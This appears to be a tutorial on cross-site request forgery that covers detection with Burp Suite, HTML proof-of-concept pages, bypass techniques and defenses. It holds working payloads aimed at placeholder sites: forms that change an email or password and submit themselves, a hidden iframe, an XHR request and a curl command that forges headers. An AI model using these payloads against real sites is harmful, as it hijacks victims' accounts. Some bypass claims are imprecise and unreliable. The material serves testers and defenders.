---
title: "CSRF Attack Guide"
categories:
  - Cybersecurity
tags:
  - cross-site-request
  - forgery-attacks
  - web-security
  - vulnerability-exploits
  - cyber-attacks
---

# Cross-Site Request Forgery (CSRF): Comprehensive Guide

## What is CSRF?

CSRF is a web security vulnerability where an attacker tricks a user's browser into sending an unintended request to a website where the user is authenticated. The browser automatically includes cookies, session tokens, and authentication headers, making the request appear legitimate to the server.

## Attack Requirements

For a CSRF attack to succeed, three conditions must exist:

1. **Relevant Action**: A state-changing operation the attacker wants to trigger (password change, fund transfer, email update, permission modification)
2. **Cookie-Based Session Handling**: The application relies solely on session cookies for authentication without additional validation mechanisms
3. **Predictable Parameters**: All request parameters can be determined or guessed by the attacker (no knowledge of current password required, for example)

## Attack Mechanism

**Step 1**: Victim logs into `https://bank.com/login` and receives session cookie `SESSIONID=abc123`

**Step 2**: Session remains active while the user browses other sites

**Step 3**: Attacker creates malicious request:

```
POST /transfer
amount=5000&toAccount=123456
```

**Step 4**: Attacker embeds the request in HTML:

```html
<img src="https://bank.com/transfer?amount=5000&toAccount=123456" />
```

**Step 5**: Victim visits attacker's page via email, social media, or malicious link

**Step 6**: Browser automatically sends request with victim's session cookie

**Step 7**: Server executes the action, believing it came from the legitimate user

## Detection with Burp Suite

### 1. Intercept Sensitive Requests

The first critical step is identifying state-changing actions. CSRF only targets operations that modify data:

- Changing email addresses
- Updating passwords
- Transferring funds
- Resetting preferences
- Modifying permissions
- Submitting forms

Use Burp Proxy → Intercept to capture these requests when legitimate users perform them:

```http
POST /change-email HTTP/1.1
Host: example.com
Cookie: sessionID=XYZ123
Content-Type: application/x-www-form-urlencoded

email=test@example.com
```

This request represents a valid action the victim normally performs. If it can be replayed from outside the legitimate interface without additional verification, the server doesn't verify the request source—exactly what CSRF exploits.

### 2. Test in Repeater

After capturing the request, send it to Burp Repeater (Right-click → Send to Repeater). Repeater enables you to:

- Manually resend the request
- Modify headers or parameters
- Observe server responses
- Confirm whether protection exists

Try replaying the request exactly as captured. If the server successfully executes the action (email changed, settings updated) even though the request didn't originate from the normal website interface, this is strong evidence of missing CSRF protection. No token means no validation means no security.

### 3. Generate CSRF PoC

Once you've verified in Burp Repeater that the application accepts requests without CSRF protection, build a Proof-of-Concept to demonstrate how the vulnerability can be triggered from any external website.

Burp Suite includes "Generate CSRF PoC" (right-click on request → Engagement tools → Generate CSRF PoC). This automatically produces an HTML form matching the intercepted request's structure.

**Why HTML Forms Demonstrate CSRF Effectively:**

1. **Automatic Cookie Attachment**: When victims load the attacker-controlled page, browsers automatically send existing authentication cookies with the request to the target site
2. **Cross-Site Submissions Are Legal**: HTML allows forms to submit to any domain, which is the core weakness CSRF exploits
3. **No JavaScript Required**: Pure HTML forms work even when JavaScript is disabled
4. **Mirrors Real Requests**: Every form parameter corresponds directly to what the backend expects

Basic generated form:

```html
<form action="https://target.com/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@example.com" />
  <input type="submit" value="Submit" />
</form>
```

You can tweak options in the CSRF PoC generator to handle:

- Large numbers of parameters
- Quirky request features
- Unusual request structures

### 4. Test Automatic Execution

Create a complete, production-ready PoC page that demonstrates the vulnerability:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CSRF Test PoC</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 50px;
            background: #f7f7f7;
            padding: 20px;
        }
        .box {
            background: white;
            padding: 25px;
            border-radius: 10px;
            width: 400px;
            box-shadow: 0px 0px 12px rgba(0,0,0,0.1);
        }
        button {
            padding: 10px 20px;
            background: #ff4444;
            border: none;
            color: white;
            cursor: pointer;
            font-size: 16px;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <div class="box">
        <h2>CSRF Proof-of-Concept</h2>
        <p>If you are logged into the target website in another tab, clicking the button below will send a request on your behalf.</p>
        
        <form id="csrf_form" action="https://target.com/change-email" method="POST">
            <input type="hidden" name="email" value="attacker@example.com">
            <button type="submit">Execute CSRF Action</button>
        </form>
    </div>
    
    <!-- Auto-submit variant for silent attacks -->
    <script>
        // Uncomment to auto-submit without user interaction
        // document.getElementById('csrf_form').submit();
    </script>
</body>
</html>
```

**What This Demonstrates**: When a user already logged into the target website opens this HTML file, their browser automatically attaches existing cookies, the form sends the request to the real server, the server sees a valid session, and the action executes even though the victim never intended it.

### 5. Testing GET-Based CSRF

Some simple CSRF exploits use GET methods and can be self-contained with a single URL. These don't require external sites:

```html
<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">
```

This image tag automatically triggers the request when the page loads, making the attack completely invisible to the victim.

## Common Defense Mechanisms

### 1. CSRF Tokens

Unique, secret, unpredictable values generated server-side and included in requests. The server validates the token before processing sensitive actions.

### 2. SameSite Cookies

Browser security mechanism controlling when cookies are sent with cross-site requests. Options:

- `SameSite=Strict`: Cookies never sent with cross-site requests
- `SameSite=Lax`: Cookies sent only with top-level navigation (Chrome default since 2021)

### 3. Referer/Origin Validation

Verifying that requests originate from the application's own domain. Less effective than token validation.

## Advanced Bypass Techniques

### Header Validation Exploits

**Missing Headers**: Suppress Referer header using `rel="noreferrer"`:

```html
<a href="https://example.com/change_password?password=123" rel="noreferrer">Click here</a>
```

**Header Forgery**: Use tools to forge Origin/Referer headers:

```bash
curl -X POST https://example.com/change_password \
-H "Origin: https://malicious-site.com" \
-d "password=newpassword123"
```

### Weak Token Implementations

**Predictable Tokens**: Tokens based on timestamps or sequential numbers can be reverse-engineered.

**Token Pool Reuse**: Capture a valid token from any session and reuse it if tokens aren't session-specific.

**Unlinked Tokens**: Tokens not tied to specific users/sessions can be reused across different accounts.

### Content-Type Manipulation

**Switching Content-Type**: Change from expected type to bypass validation:

```html
<form action="https://example.com/update" method="POST" enctype="multipart/form-data">
  <input type="hidden" name="password" value="newpass" />
</form>
```

**Rare Content Types**: Use uncommon types like `text/csv`, `application/zip`, or `application/xhtml+xml` to bypass restrictive checks.

### Regex Filter Bypasses

- Use semicolons instead of question marks: `https://example.com;test=123`
- Use backward slashes: `https://example.com\test`
- Use relative paths: `https://example.com/../test`

### Advanced Payloads

**Iframe Exploitation**:

```html
<iframe src="https://example.com/change_password?password=123" style="display:none;"></iframe>
```

**AJAX Requests**:

```javascript
const xhr = new XMLHttpRequest();
xhr.open("POST", "https://example.com/change_password");
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send(JSON.stringify({ password: "newpass" }));
```

**Automated Form Submission**:

```html
<form id="csrf_form" method="POST" action="https://example.com/change_password">
  <input type="hidden" name="password" value="newpass" />
</form>
<script>
  document.getElementById('csrf_form').submit();
</script>
```

## Best Practices for Defense

### 1. Strong Token Generation

Use cryptographically secure random values (`openssl_random_pseudo_bytes()` in PHP, `crypto.randomBytes()` in Node.js). Never use predictable patterns.

### 2. Session-Based Tokens

Tie tokens to specific user sessions and enforce one-time use to prevent replay attacks.

### 3. Double-Submit Cookies

Place tokens in both request body and cookies, validate both match:

```javascript
document.cookie = "csrf-token=" + token;
```

### 4. Strict Content-Type Enforcement

Reject unexpected content types. Only accept explicitly required formats (JSON, form-encoded data).

### 5. SameSite Cookies

Set `SameSite=Strict` or `SameSite=Lax`:

```javascript
document.cookie = "session_id=12345; SameSite=Strict";
```

### 6. Multi-Layered Validation

Combine multiple defenses: tokens + SameSite cookies + Origin/Referer validation for critical operations.

## Key Takeaways

- CSRF exploits the trust relationship between user browsers and authenticated web applications
- Successful attacks require predictable requests, cookie-based authentication, and no additional validation
- Modern defenses include CSRF tokens, SameSite cookies, and header validation
- Weak implementations can be bypassed through header manipulation, token exploitation, content-type switching, and automated scripts
- Effective protection requires cryptographically secure tokens, session binding, strict validation, and layered security measures